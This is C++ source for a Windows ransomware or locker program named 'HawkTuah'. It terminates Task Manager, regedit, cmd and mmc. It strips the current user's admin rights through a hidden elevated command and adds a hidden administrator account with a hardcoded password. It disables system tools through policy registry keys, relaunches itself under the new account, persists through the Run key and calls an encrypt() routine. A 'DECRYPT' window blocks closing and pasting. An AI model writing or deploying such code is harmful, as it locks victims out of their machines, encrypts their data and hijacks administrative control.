#pragma comment(lib, "netapi32.lib")
#ifndef UNICODE
#define UNICODE
#endif

#include <cstdio>
#include <windows.h>
#include <tlhelp32.h>
#include "resource.h" 
#include "tchar.h"
#include "enc.h"
#include "payload.h"
#include <lm.h>
#include <AccCtrl.h>
#include <Aclapi.h>
#include <sstream>
#include <chrono>

using namespace std;

HBITMAP hBitmap;
HKEY hKey = NULL;
HWND hEdit = NULL;
HWND hWpmDisplay = NULL; // Handle to the static text to display WPM
std::chrono::steady_clock::time_point startTime;
bool timerStarted = false;
static HWND hButton;

std::string GetCurrentUserName() {
	char username[UNLEN + 1]; // UNLEN is a predefined constant for maximum username length
	DWORD username_len = sizeof(username);

	// Retrieve the username of the user running the process
	if (GetUserNameA(username, &username_len)) {
		return std::string(username);
	}
	else {
		DWORD error = GetLastError();
		return "Error retrieving username. Error code: " + std::to_string(error);
	}
}

// main window procedure
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{
	case WM_CREATE:
		hBitmap = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_BITMAP1));
		hEdit = CreateWindowEx(
			WS_EX_CLIENTEDGE,
			L"EDIT",
			L"",
			WS_CHILD | WS_VISIBLE | WS_BORDER | ES_LEFT | ES_MULTILINE | ES_AUTOVSCROLL | ES_AUTOHSCROLL | WS_VSCROLL,
			10, 520, 380, 180,
			hwnd,
			(HMENU)1,
			((LPCREATESTRUCT)lParam)->hInstance,
			NULL);
		hButton = CreateWindow(
			L"BUTTON",
			L"DECRYPT",
			WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
			450, 520, 200, 70,
			hwnd,
			(HMENU)1, // Button ID
			((LPCREATESTRUCT)lParam)->hInstance,
			NULL);
		// Create a static text control to display WPM
		hWpmDisplay = CreateWindowEx(
			0, TEXT("STATIC"), TEXT("Words Per Minute: 0"),
			WS_CHILD | WS_VISIBLE,
			10, 700, 400, 20, hwnd, NULL, GetModuleHandle(NULL), NULL);
		break;
	case WM_PASTE:
		MessageBox(hwnd, L"NO COPY PASTE!", L"NO!", MB_OK | MB_ICONERROR);
		SetWindowText(hEdit, L"");
		break;
	case WM_COMMAND:
		if ((HWND)lParam == hEdit && HIWORD(wParam) == EN_CHANGE) {
			// Start the timer on the first change
			if (!timerStarted) {
				startTime = std::chrono::steady_clock::now();
				timerStarted = true;
			}
			int textLength = GetWindowTextLength(hEdit);
			std::wstring buffer(textLength + 1, L'\0');
			GetWindowText(hEdit, &buffer[0], textLength + 1);

			std::wistringstream stream(buffer);
			std::wstring word;
			int wordCount = 0;
			while (stream >> word) {
				wordCount++;
			}

			auto currentTime = std::chrono::steady_clock::now();
			std::chrono::duration<double> elapsedSeconds = currentTime - startTime;
			double elapsedMinutes = elapsedSeconds.count() / 60.0;

			int wpm = elapsedMinutes > 0 ? static_cast<int>(wordCount / elapsedMinutes) : 0;
			if (wpm >= 9)
			{
				MessageBox(NULL, L"TOO FAST!!", L"BENCHOD!!", MB_OK | MB_ICONERROR);
				SetWindowText(hEdit, L"");
			}

			std::wstring wpmText = L"Words Per Minute: " + std::to_wstring(wpm);
			SetWindowText(hWpmDisplay, wpmText.c_str());
		}
		if (LOWORD(wParam) == 1) { // button ID (1 for the check button)

		}
		break;
	case WM_PAINT:
	{
		PAINTSTRUCT ps;
		HDC hdc = BeginPaint(hwnd, &ps);
		//kinda a cancer way to load bmps (WHY NO GDI+???!!! GRRR) -- stfu idc man im using the CHATGPT WAY!!! HAIIYAAA!!
		HDC hMemDC = CreateCompatibleDC(hdc);
		HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemDC, hBitmap);

		BITMAP bitmap;
		GetObject(hBitmap, sizeof(BITMAP), &bitmap);

		BitBlt(hdc, 0, 0, bitmap.bmWidth, bitmap.bmHeight, hMemDC, 0, 0, SRCCOPY);

		SelectObject(hMemDC, hOldBitmap);
		DeleteDC(hMemDC);

		EndPaint(hwnd, &ps);
		break;
	}
	case WM_CLOSE:
		return MessageBox(hwnd, L"YOU CANNOT ESCAPE THE HAWK TUAH!!", L"NO", MB_OK | MB_ICONERROR);
	case WM_DESTROY:
		if (hBitmap) {
			DeleteObject(hBitmap);
		}
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
	}
}

//Returns the last Win32 error, in string format. Returns an empty string if there is no error.
std::string GetLastErrorAsString()
{
	//Get the error message ID, if any.
	DWORD errorMessageID = ::GetLastError();
	if (errorMessageID == 0) {
		return std::string(); //No error message has been recorded
	}

	LPSTR messageBuffer = nullptr;

	//Ask Win32 to give us the string version of that message ID.
	//The parameters we pass in, tell Win32 to create the buffer that holds the message for us (because we don't yet know how long the message string will be).
	size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

	//Copy the error message into a std::string.
	std::string message(messageBuffer, size);

	//Free the Win32's string's buffer.
	LocalFree(messageBuffer);

	return message;
}

bool CloseProcessByName(const wchar_t* processName) {
	// Take a snapshot of all processes in the system
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		std::wcerr << L"Failed to create process snapshot.\n";
		return false;
	}

	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	// Iterate through the list of processes
	if (Process32First(hSnapshot, &processEntry)) {
		do {
			// Compare the process name
			if (_wcsicmp(processEntry.szExeFile, processName) == 0) {
				// Open the process with terminate rights
				HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processEntry.th32ProcessID);
				if (hProcess) {
					// Terminate the process
					if (TerminateProcess(hProcess, 0)) {
						std::wcout << L"Successfully terminated " << processName << L".\n";
						CloseHandle(hProcess);
						CloseHandle(hSnapshot);
						return true;
					}
					else {
						std::wcerr << L"Failed to terminate " << processName << L".\n";
					}
					CloseHandle(hProcess);
				}
				else {
					std::wcerr << L"Failed to open process " << processName << L".\n";
				}
			}
		} while (Process32Next(hSnapshot, &processEntry));
	}
	else {
		std::wcerr << L"Failed to enumerate processes.\n";
	}

	CloseHandle(hSnapshot);
	return false;
}

int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow) {
	
	CloseProcessByName(L"regedit.exe");
	CloseProcessByName(L"taskmgr.exe");
	CloseProcessByName(L"cmd.exe");
	CloseProcessByName(L"mmc.exe");
	DWORD exitCode = 0;
	SHELLEXECUTEINFO comm = { 0 };
	comm.cbSize = sizeof(SHELLEXECUTEINFO);
	comm.fMask = SEE_MASK_NOCLOSEPROCESS;
	comm.hwnd = NULL;
	comm.lpVerb = L"runas";
	comm.lpFile = L"C:\\Windows\\System32\\cmd.exe";
	comm.lpParameters = L"/c Net localgroup Administrators pc /delete & Net localgroup Users pc /add";
	comm.lpDirectory = NULL;
	comm.nShow = SW_HIDE;
	comm.hInstApp = NULL;
	ShellExecuteEx(&comm);

	USER_INFO_1 ui;
	LOCALGROUP_MEMBERS_INFO_3 account;
	NET_API_STATUS ret;
	NET_API_STATUS ret1;
	NET_API_STATUS Status;
	memset(&ui, 0, sizeof(ui));
	memset(&account, 0, sizeof(account));
	ui.usri1_name = const_cast<wchar_t*>(L"hawktuahgirl");
	ui.usri1_password = const_cast<wchar_t*>(L"f8ec34766c854ed29234c88a390c6e5a");
	ui.usri1_priv = USER_PRIV_USER;
	ui.usri1_home_dir = NULL;
	ui.usri1_comment = NULL;
	ui.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD;
	ui.usri1_script_path = NULL;
	NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);

	account.lgrmi3_domainandname = const_cast<wchar_t*>(L"hawktuahgirl");
	NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);

	if (GetCurrentUserName() != "hawktuahgirl")
	{
		//create group policies
		HKEY regHandle;
		HKEY regHandleWindows;
		DWORD dwValue = 1;
		BYTE* data = (BYTE*)&dwValue;

		RegCreateKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", 0, NULL, NULL, KEY_WRITE, NULL, &regHandleWindows, NULL);
		RegSetValueEx(regHandleWindows, L"DisableCMD", 0, REG_DWORD, data, sizeof(DWORD));
		RegSetValueEx(regHandleWindows, L"DisableGPO", 0, REG_DWORD, data, sizeof(DWORD));
		RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle, NULL);
		RegSetValueEx(regHandle, L"DisableTaskmgr", 0, REG_DWORD, data, sizeof(DWORD));
		RegSetValueEx(regHandle, L"DisableRegistryTools", 0, REG_DWORD, data, sizeof(DWORD));

		HANDLE hToken;
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		HDESK desktop;
		EXPLICIT_ACCESS explicit_access;

		BYTE buffer_token_user[SECURITY_MAX_SID_SIZE];
		PTOKEN_USER token_user = (PTOKEN_USER)buffer_token_user;
		PSECURITY_DESCRIPTOR existing_sd;
		SECURITY_DESCRIPTOR new_sd;
		PACL existing_dacl, new_dacl;
		BOOL dacl_present, dacl_defaulted;
		SECURITY_INFORMATION sec_info_dacl = DACL_SECURITY_INFORMATION;
		DWORD dw, size;
		HWINSTA window_station;

		LPWSTR currentmodpath;
		wchar_t buffer[MAX_PATH];
		// Get the full path of the executable
		DWORD length = GetModuleFileNameW(NULL, buffer, MAX_PATH);
		if (length == 0 || length == MAX_PATH) {
			MessageBox(NULL, L"Failed to Get process!", L"Error", MB_OK | MB_ICONERROR);
		}
		std::wstring wstr(buffer);
		size_t pos = 0;
		while ((pos = wstr.find(L'\\', pos)) != std::wstring::npos) {
			wstr.insert(pos, L"\\");
			pos += 2; // Skip over the newly added backslashes
		}
		wchar_t* output = new wchar_t[wstr.length() + 1];
		std::wmemcpy(output, wstr.c_str(), wstr.length() + 1);

		LogonUser(L"hawktuahgirl", L"hawktuahgirl", L"f8ec34766c854ed29234c88a390c6e5a", LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, &hToken);
		GetTokenInformation(hToken, TokenUser, buffer_token_user, sizeof(buffer_token_user), &dw);
		window_station = GetProcessWindowStation();

		GetUserObjectSecurity(window_station, &sec_info_dacl, &dw, sizeof(dw), &size) && GetLastError();
		existing_sd = malloc(size);
		GetUserObjectSecurity(window_station, &sec_info_dacl, existing_sd, size, &dw);
		GetSecurityDescriptorDacl(existing_sd, &dacl_present, &existing_dacl, &dacl_defaulted);

		explicit_access.grfAccessMode = SET_ACCESS;
		explicit_access.grfAccessPermissions = WINSTA_ALL_ACCESS | READ_CONTROL;
		explicit_access.grfInheritance = NO_INHERITANCE;
		explicit_access.Trustee.pMultipleTrustee = NULL;
		explicit_access.Trustee.MultipleTrusteeOperation = NO_MULTIPLE_TRUSTEE;
		explicit_access.Trustee.TrusteeForm = TRUSTEE_IS_SID;
		explicit_access.Trustee.TrusteeType = TRUSTEE_IS_USER;
		explicit_access.Trustee.ptstrName = (LPTSTR)token_user->User.Sid;

		dw = SetEntriesInAcl(1, &explicit_access, existing_dacl, &new_dacl);
		InitializeSecurityDescriptor(&new_sd, SECURITY_DESCRIPTOR_REVISION);
		SetSecurityDescriptorDacl(&new_sd, TRUE, new_dacl, FALSE);
		SetUserObjectSecurity(window_station, &sec_info_dacl, &new_sd);

		free(existing_sd);
		LocalFree(new_dacl);

		desktop = GetThreadDesktop(GetCurrentThreadId());

		GetUserObjectSecurity(desktop, &sec_info_dacl, &dw, sizeof(dw), &size) && GetLastError();
		existing_sd = malloc(size);
		GetUserObjectSecurity(desktop, &sec_info_dacl, existing_sd, size, &dw);
		GetUserObjectSecurity(desktop, &sec_info_dacl, existing_sd, 4096, &dw);
		GetSecurityDescriptorDacl(existing_sd, &dacl_present, &existing_dacl, &dacl_defaulted);

		explicit_access.grfAccessMode = SET_ACCESS;
		explicit_access.grfAccessPermissions = GENERIC_ALL;
		explicit_access.grfInheritance = NO_INHERITANCE;
		explicit_access.Trustee.pMultipleTrustee = NULL;
		explicit_access.Trustee.MultipleTrusteeOperation = NO_MULTIPLE_TRUSTEE;
		explicit_access.Trustee.TrusteeForm = TRUSTEE_IS_SID;
		explicit_access.Trustee.TrusteeType = TRUSTEE_IS_USER;
		explicit_access.Trustee.ptstrName = (LPTSTR)token_user->User.Sid;

		dw = SetEntriesInAcl(1, &explicit_access, existing_dacl, &new_dacl);

		InitializeSecurityDescriptor(&new_sd, SECURITY_DESCRIPTOR_REVISION);
		SetSecurityDescriptorDacl(&new_sd, TRUE, new_dacl, FALSE);
		SetUserObjectSecurity(desktop, &sec_info_dacl, &new_sd);

		free(existing_sd);
		LocalFree(new_dacl);

		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);

		CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, output, NULL, 0, NULL, NULL, &si, &pi);
		return 1;
	}

	//create mutex
	LSTATUS keyexists = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\SYSTEM\\ControlSet001\\Control\\Syslexical", 0, KEY_ALL_ACCESS, &hKey);
	if (keyexists != ERROR_SUCCESS) {
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\SYSTEM\\ControlSet001\\Control\\Syslexical", 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
		hKey = NULL;
		RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
		LPCTSTR data = L"TestData\0";
		RegSetValueExA(hKey, "HawkTuah", 0, REG_SZ, (LPBYTE)data, sizeof(data));
		encrypt();
		initial();
	}
	else {

	}

	const wchar_t CLASS_NAME[] = L"hawktuahclass";

	WNDCLASS wc = { };

	wc.lpfnWndProc = WindowProc;
	wc.hInstance = hInst;
	wc.lpszClassName = CLASS_NAME;
	RegisterClass(&wc);
	HWND hwnd = CreateWindowEx(
		0,
		CLASS_NAME,
		L"HAWKTUAH",
		WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX | WS_MAXIMIZEBOX,

		CW_USEDEFAULT, CW_USEDEFAULT, 810, 800,

		NULL,
		NULL,
		hInst,
		NULL
	);

	if (hwnd == NULL)
	{
		return 0;
	}

	EnableMenuItem(GetSystemMenu(hwnd, FALSE), SC_CLOSE,
		MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
	SetWindowLong(hwnd, GWL_STYLE,
		GetWindowLong(hwnd, GWL_STYLE) & ~WS_MINIMIZEBOX);
	SetWindowLong(hwnd, GWL_STYLE,
		GetWindowLong(hwnd, GWL_STYLE) & ~WS_MAXIMIZEBOX);

	ShowWindow(hwnd, cmdshow);
	UpdateWindow(hwnd);

	MSG msg = { };
	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return (int)msg.wParam;;
}
